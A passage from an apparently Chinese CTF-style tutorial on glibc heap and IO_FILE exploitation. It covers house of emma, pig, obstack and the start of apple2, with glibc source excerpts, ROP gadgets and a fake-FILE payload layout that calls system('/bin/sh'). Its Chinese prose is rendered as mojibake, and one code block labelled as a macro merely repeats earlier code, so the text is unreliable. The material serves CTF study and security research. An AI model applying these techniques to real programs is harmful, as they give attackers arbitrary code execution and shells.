cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">close_cb</span> (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å››ä¸ªå‡½æ•°ä½œä¸ºæˆ‘ä»¬è€ƒè™‘èŒƒå›´å†…çš„å‡½æ•°ï¼Œå‘ç°å…¶ä¸­è°ƒç”¨çš„å‡½æ•°éƒ½æ˜¯<code>_IO_cookie_file</code>çš„ä¸€ä¸ªæˆå‘˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> __fp;</span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_io_functions_t</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;<span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;<span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;<span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;<span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬å‘ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>åœ¨Glibc2.34åŠä»¥ä¸Šç‰ˆæœ¬ä¸­çš„å‡½æ•°éƒ½è¿›è¡Œäº†æŒ‡é’ˆåŠ å¯†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7e06774</span> &lt;_IO_cookie_write+<span class="number">20</span>&gt;:        ror    rax,<span class="number">0x11</span></span><br><span class="line"><span class="number">0x7ffff7e06778</span> &lt;_IO_cookie_write+<span class="number">24</span>&gt;:        <span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x30</span></span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºå³ç§»0x11ä½ï¼Œç„¶åå’Œtlsé‡Œçš„ä¸€ä¸ªæ•°æ®è¿›è¡Œäº†å¼‚æˆ–ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦é€šè¿‡TSUï¼Œlargebin attackç­‰çš„æ‰‹æ³•å°†å…¶æ”¹ä¸ºä¸€ä¸ªç‰¹å®šçš„å€¼ï¼Œå°±èƒ½è¿›è¡Œç»•è¿‡ï¼Œåæ­£è¦ä¹ˆæ³„éœ²è¦ä¹ˆè¦†ç›–ï¼Œåªè¦èƒ½æˆå°±è¡Œ</p><p>å› æ­¤ï¼Œåˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>æˆªè‡³æŸä¸ª <code>IO_FILE</code> çš„æŒ‡é’ˆï¼ˆ<code>IO_list_all/stdxxx-&gt;chain</code> ç­‰éƒ½å¯ä»¥ï¼‰ä¸ºå †åœ°å€</li><li>å †ä¸Šä¼ªé€  <code>IO_FILE</code> ç»“æ„ï¼Œå…¶ <code>vtable</code> æ›¿æ¢ä¸º<code>_IO_cookie_jumps+XX</code>ï¼Œ<code>XX</code> ä¸ºä¸€ä¸ªåç§»é‡</li><li>ä¼ªé€ å¥½å‡½æ•°æŒ‡é’ˆå’Œè°ƒç”¨å‚æ•°ï¼ŒæŒ‡é’ˆéœ€è¦å¾ªç¯å¼‚æˆ–å’ŒåŠ å¯†ï¼ˆåœ¨æ‰§è¡Œ<code>_IO_cookie_write</code>çš„æ—¶å€™ï¼Œrdiæ˜¯fake_iofileï¼Œå› æ­¤å¯ä»¥é€šè¿‡gadgetæ¥ROPï¼‰</li><li>è°ƒç”¨åˆ°<code>_IO_cookie_read</code> ç­‰å‡½æ•°ï¼Œè¿›è€Œæ‰§è¡Œä»»æ„å‡½æ•°</li></ul><h3 id="ç›¸å…³æŠ€å·§-17"><a href="#ç›¸å…³æŠ€å·§-17" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li><p>å¸¸ç”¨çš„ <code>gadget</code> æœ‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">;æ ˆè¿ç§»</span><br><span class="line">mov    rbp,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line">mov    rax,QWORD PTR [rbp+<span class="number">0x18</span>]</span><br><span class="line">lea    r13,[rbp+<span class="number">0x10</span>]</span><br><span class="line">mov    DWORD PTR [rbp+<span class="number">0x10</span>],<span class="number">0x0</span></span><br><span class="line">mov    rdi,r13</span><br><span class="line">call   QWORD PTR [rax+<span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; rdiè½¬rdx</span><br><span class="line">mov rdx, qword ptr [rdi + <span class="number">8</span>]</span><br><span class="line">mov qword ptr [rsp], rax</span><br><span class="line">call qword ptr [rdx + <span class="number">0x20</span>]</span><br></pre></td></tr></table></figure></li><li><p><code>pointer_guard</code> å°±åœ¨ <code>canary</code> ä¸‹é¢ï¼Œåç§»å¯èƒ½éœ€è¦çˆ†ç ´</p></li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-17"><a href="#åˆ©ç”¨æ•ˆæœ-17" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li></ul><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p>2021 æ¹–æ¹˜æ¯çš„ House OF Emma</p><h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><h3 id="æ¼æ´æˆå› -19"><a href="#æ¼æ´æˆå› -19" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-19"><a href="#é€‚ç”¨èŒƒå›´-19" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥è¿›è¡Œ <code>largebin attack</code></li><li>å¯ä»¥è§¦å‘ <code>IO</code> æµæ“ä½œ</li></ul><h3 id="åˆ©ç”¨åŸç†-19"><a href="#åˆ©ç”¨åŸç†-19" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åœ¨<code>_IO_str_jumps</code> ä¸­ï¼Œå­˜åœ¨ç€<code>_IO_str_overflow</code> å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// è¦†ç›–åˆ°è¿™é‡Œ</span></span><br><span class="line">  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// è°ƒç”¨malloc</span></span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);<span class="comment">// è°ƒç”¨memecpyï¼Œè¦†ç›–</span></span><br><span class="line">      <span class="built_in">free</span> (old_buf); <span class="comment">// è°ƒç”¨free</span></span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line">      <span class="comment">//......</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><p>åªéœ€è¦åˆç†æ§åˆ¶<code>_IO_buf_end</code>å’Œ<code>_IO_buf_base</code>å°±å¯ä»¥å®ç°chunkçš„sizeå¯æ§ï¼Œåªè¦åˆ†é…å‡ºæ¥çš„chunkä¹Ÿå¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨ä»»æ„åœ°å€ä»»æ„å†™</p><p>åˆ©ç”¨æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>å…ˆé€šè¿‡largebin attackå°†æƒ³æ§åˆ¶çš„chunk_addr+0x18å†™ä¸Šä¸€ä¸ªå †åœ°å€ï¼Œç„¶åé€šè¿‡tcache stashing unlink+ä½¿å¾—åˆ†é…çš„chunkå¯æ§</li><li>ä¼ªé€ ä¸€ä¸ª<code>_IO_FILE_plus</code>ç»“æ„ï¼Œå…¶vtableæŒ‡å‘<code>_IO_str_jumps</code></li><li>ç„¶åä¼ªé€ çš„<code>_IO_buf_base</code>ä¸ºæƒ³å†™å…¥çš„å€¼çš„èµ·ç‚¹ï¼ˆæ‰€ä»¥è¦å…ˆåœ¨å·²çŸ¥åœ°å€å†™å…¥æƒ³å†™å…¥çš„æ•°æ®ï¼‰ï¼Œä¹‹ååˆç†æ§åˆ¶<code>_IO_buf_end</code>å®ç°æ§åˆ¶åˆ†é…chunkçš„å¤§å°</li><li>åœ¨ <code>memcpy</code> ä¸­è¦†ç›–åœ°å€ï¼Œå¦‚å¯ä»¥è¦†ç›–<code>__malloc_hook/__free_hook</code> ç­‰</li></ul><p>è¯¥æ–¹æ³•éœ€è¦ç»“åˆå…¶ä»–å †åˆ©ç”¨æŠ€æœ¯ï¼Œéœ€è¦ä¿è¯ <code>malloc</code> åˆ†é…å‡ºæ¥çš„ <code>chunk</code> çš„åœ°å€æ˜¯å¯æ§çš„ã€‚è¯¥æ–¹æ³•ä¸»è¦æä¾›äº†å¯¹ <code>IO</code> ç³»åˆ—å‡½æ•°ä¸­é—´æ¥è°ƒç”¨ <code>mallc/free/memcpy</code> çš„ç»„åˆåˆ©ç”¨ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-18"><a href="#ç›¸å…³æŠ€å·§-18" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>å¯ä»¥ <code>largebin attack</code> æ‰“æ‰ <code>mp_.tcachebins</code>ï¼Œè¿›è€Œèƒ½æŠŠå¾ˆå¤§çš„ <code>chunk</code> ä¹Ÿæ”¾è¿›å…¥ <code>tcache</code> è¿›è¡Œç®¡ç†</li><li>é«˜ç‰ˆæœ¬æ²¡æœ‰ <code>hook</code> çš„è¯ï¼Œå¯ä»¥åˆ©ç”¨ <code>memcpy@got</code>ï¼Œé€šè¿‡è¦†å†™ <code>got</code> æ¥è¿›è¡Œ <code>rce</code></li><li>å¯ä»¥å¤šæ¬¡ <code>house of pig</code> ç»„åˆè°ƒç”¨</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-18"><a href="#åˆ©ç”¨æ•ˆæœ-18" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li><li><code>ROP</code> æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</li></ul><h2 id="house-of-obstack"><a href="#house-of-obstack" class="headerlink" title="house of obstack"></a>house of obstack</h2><h3 id="æ¼æ´æˆå› -20"><a href="#æ¼æ´æˆå› -20" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-20"><a href="#é€‚ç”¨èŒƒå›´-20" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥æ‰§è¡Œä¸€æ¬¡ <code>largebin attack</code></li><li>å¯ä»¥è§¦å‘ <code>IO</code> æµæ“ä½œ</li></ul><h3 id="åˆ©ç”¨åŸç†-20"><a href="#åˆ©ç”¨åŸç†-20" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>ä¸€æ¡æ–°çš„åˆ©ç”¨é“¾ï¼Œä¼ªé€  <code>vtable</code> ä¸º<code>_IO_obstack_jumps</code>ï¼Œç„¶åè°ƒç”¨åˆ°<code>_IO_obstack_xsputn</code>ï¼Œç´§æ¥ç€è°ƒç”¨ <code>obstack_grow</code>ï¼Œå…¶ä»£ç ä¸ºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> obstack_grow(OBSTACK, where, length)                      \</span></span><br><span class="line"><span class="meta">  __extension__                                   \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                       \</span></span><br><span class="line"><span class="meta">       int __len = (length);                              \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, __len);                      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);                     \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;                           \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨<code>_obstack_newchunk</code> è°ƒç”¨äº† <code>CALL_CHUNKFUN</code> è¿™ä¸ªå®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *old_chunk = h-&gt;chunk;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *new_chunk;</span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = <span class="built_in">CALL_CHUNKFUN</span> (h, new_size);</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå®ä¼šè°ƒç”¨åˆ°å‡½æ•°æŒ‡é’ˆï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *old_chunk = h-&gt;chunk;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *new_chunk;</span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = <span class="built_in">CALL_CHUNKFUN</span> (h, new_size);</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œå…¶å°±æ˜¯åˆ©ç”¨è¯¥å‡½æ•°æŒ‡é’ˆè¿›è¡Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµã€‚</p><h3 id="ç›¸å…³æŠ€å·§-19"><a href="#ç›¸å…³æŠ€å·§-19" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>ä¼ªé€ çš„ <code>IO_FILE</code> å¸ƒå±€å¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨ <code>largebin attack</code> ä¼ªé€ <code>_IO_FILE</code>ï¼Œè®°å®Œæˆä¼ªé€ çš„ <code>chunk</code> ä¸º <code>A</code>ï¼ˆæˆ–è€…åˆ«çš„æ‰‹æ³•ï¼‰</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0xd8</code> å¤„è®¾ä¸º<code>_IO_obstack_jumps+0x20</code></li><li><code>chunk A</code> å†…åç§»ä¸º <code>0xe0</code> å¤„è®¾ç½® <code>chunk A</code> çš„åœ°å€ä½œä¸º <code>obstack</code> ç»“æ„ä½“</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x18</code> å¤„è®¾ä¸º <code>1</code>ï¼ˆ<code>next_free</code>)</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x20</code> å¤„è®¾ä¸º <code>0</code>ï¼ˆ<code>chunk_limit</code>ï¼‰</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x48</code> å¤„è®¾ä¸º <code>&amp;/bin/sh</code></li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x38</code> å¤„è®¾ä¸º <code>system</code> å‡½æ•°çš„åœ°å€</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x28</code> å¤„è®¾ä¸º <code>1</code>ï¼ˆ<code>_IO_write_ptr</code>)</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x30</code> å¤„è®¾ä¸º <code>0</code> (<code>_IO_write_end</code>)</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x50</code> å¤„è®¾ä¸º <code>1</code> (<code>use_extra_arg</code>)</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="built_in">flat</span>(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x18</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x30</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x38</span>:&amp;system,</span><br><span class="line">        <span class="number">0x48</span>:&amp;/bin/sh,</span><br><span class="line">        <span class="number">0x50</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0xd8</span>:&amp;_IO_obstack_jumps+<span class="number">0x20</span>,</span><br><span class="line">        <span class="number">0xe0</span>:chunkA,</span><br><span class="line">    &#125;</span><br><span class="line">    filler= <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>glibc-2.37</code> å¼€å§‹è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨é“¾ä¸ºï¼š<code>__printf_buffer_as_file_overflow -&gt; __printf_buffer_flush -&gt; __printf_buffer_flush_obstack-&gt;__obstack_newchunk</code>ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ-19"><a href="#åˆ©ç”¨æ•ˆæœ-19" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li></ul><h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><h3 id="æ¼æ´æˆå› -21"><a href="#æ¼æ´æˆå› -21" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><ul><li>å †æº¢å‡º</li></ul><h3 id="é€‚ç”¨èŒƒå›´-21"><a href="#é€‚ç”¨èŒƒå›´-21" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å·²çŸ¥ <code>heap</code> åœ°å€å’Œ <code>glibc</code> åœ°å€</li><li>èƒ½æ§åˆ¶ç¨‹åºæ‰§è¡Œ <code>IO</code> æ“ä½œï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼šä» <code>main</code> å‡½æ•°è¿”å›ã€è°ƒç”¨ <code>exit</code> å‡½æ•°ã€é€šè¿‡<code>__malloc_assert</code> è§¦å‘</li><li>èƒ½æ§åˆ¶<code>_IO_FILE</code> çš„ <code>vtable</code> å’Œ<code>_wide_data</code>ï¼Œä¸€èˆ¬ä½¿ç”¨ <code>largebin attack</code> å»æ§åˆ¶</li></ul><h3 id="åˆ©ç”¨åŸç†-21"><a href="#åˆ©ç”¨åŸç†-21" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åœ¨<code>_IO_wfile_jumps</code>çš„<code>_IO_wfile_overflow</code> å‡½æ•°ä¸­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  